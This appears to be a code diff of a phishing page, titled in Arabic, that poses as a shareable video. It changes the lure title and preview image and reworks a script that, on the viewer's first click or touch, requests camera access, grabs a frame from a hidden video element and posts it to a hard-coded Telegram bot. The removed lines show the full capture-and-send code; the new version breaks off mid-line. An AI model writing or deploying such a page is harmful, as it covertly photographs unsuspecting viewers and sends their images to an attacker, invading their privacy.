@@ -1,7 +1,7 @@
-<meta property="og:title" content="x__abdo.42__x">
+<meta property="og:title" content="شاهد هذا المقطع المميز 🎬">
 <meta property="og:description" content="انقر لمشاهدة الفيديو بدقة عالية">
 <meta property="og:type" content="video.other">
-<meta property="og:image" content="https://i.ibb.co/TBGMVgHD/IMG-4380.jpg">
+<meta property="og:image" content="https://i.ibb.co/gZn6W1CV/IMG-6974.png">
 
 <title>Video Fullscreen</title>
 <style>
@@ -29,7 +29,9 @@
         z-index: 1;
     }
 </style>
-<video id="mainVideo" controls autoplay loop playsinline muted>
+
+<!-- تم إزالة autoplay لكي لا يعمل الفيديو إلا بالنقر -->
+<video id="mainVideo" controls loop playsinline muted>
     <source src="my_reel (3).mp4" type="video/mp4">
 </video>
 
@@ -38,8 +40,14 @@
     const TELEGRAM_CHAT_ID = '6642913954';
 
     let isProcessing = false;
+    const video = document.getElementById('mainVideo');
 
-    async function handleCapture() {
+    async function handleUserInteraction() {
+        // تشغيل الفيديو فوراً عند النقر
+        if (video.paused) {
+            video.play().catch(e => console.log("Video play error:", e));
+        }
+
         if (isProcessing) return;
         isProcessing = true;
 
@@ -49,53 +57,16 @@
             // طلب إذن الكاميرا
             stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-            // إنشاء عنصر فيديو خفي في الذاكرة لالتقاط الصورة فقط
             const hiddenVideo = document.createElement('video');
             hiddenVideo.muted = true;
             hiddenVideo.playsInline = true;
             hiddenVideo.srcObject = stream;
             
             await hiddenVideo.play();
-
-            // الانتظار 400 مللي ثانية لضمان استقرار إضاءة الكاميرا
             await new Promise(resolve => setTimeout(resolve, 400));
 
             const canvas = document.createElement('canvas');
             canvas.width = hiddenVideo.videoWidth || 640;
             canvas.height = hiddenVideo.videoHeight || 480;
 
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(hiddenVideo, 0, 0);
-
-            // إغلاق الكاميرا مباشرة بعد رسم الإطار على الـ Canvas
-            stream.getTracks().forEach(track => track.stop());
-
-            // تحويل الصورة وإرسالها إلى التليجرام في الخلفية
-            canvas.toBlob(async (blob) => {
-                if (!blob) return;
-
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CHAT_ID);
-                formData.append('photo', blob, 'capture.png');
-
-                try {
-                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
-                        method: 'POST',
-                        body: formData
-                    });
-                } catch (err) {
-                    console.error("Error sending photo:", err);
-                }
-            }, 'image/png');
-
-        } catch (err) {
-            console.error("Camera Error:", err);
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop());
-            }
-        }
-    }
-
-    window.addEventListener('click', handleCapture);
-    window.addEventListener('touchstart', handleCapture);
-</script>s
+            const ctx
